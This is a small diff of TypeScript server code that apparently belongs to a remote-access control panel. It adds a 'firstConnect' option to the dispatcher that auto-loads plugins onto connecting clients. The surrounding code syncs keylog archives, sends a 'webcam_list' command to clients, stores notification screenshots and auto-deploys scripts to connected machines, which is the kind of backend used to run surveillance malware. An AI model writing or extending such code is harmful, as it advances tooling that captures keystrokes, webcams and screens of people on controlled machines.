@@ -218,7 +218,7 @@ type WsLifecycleDeps = {
   handleDesktopAudioViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   dispatchAutoScriptsForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
   dispatchAutoDeploysForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
-  dispatchAutoLoadPlugins: (info: ClientInfo) => void;
+  dispatchAutoLoadPlugins: (info: ClientInfo, opts?: { firstConnect?: boolean }) => void;
   dispatchKeylogArchiveSync?: (clientId: string, ws: ServerWebSocket<SocketData>) => boolean;
   takePendingNotificationScreenshot: (clientId: string) => any;
   storeNotificationScreenshot: (
@@ -1140,7 +1140,7 @@ export async function handleWebSocketMessage(
         const reconnectedWithinGrace = cancelPendingOffline(infoObj.id);
 
         deps.dispatchAutoDeploysForConnection(infoObj, ws);
-        deps.dispatchAutoLoadPlugins(infoObj);
+        deps.dispatchAutoLoadPlugins(infoObj, { firstConnect: ws.data.firstConnect === true });
         deps.dispatchKeylogArchiveSync?.(infoObj.id, ws);
         deps.sendDesktopCommand(infoObj, "webcam_list", {});
         deps.notifyDashboard();
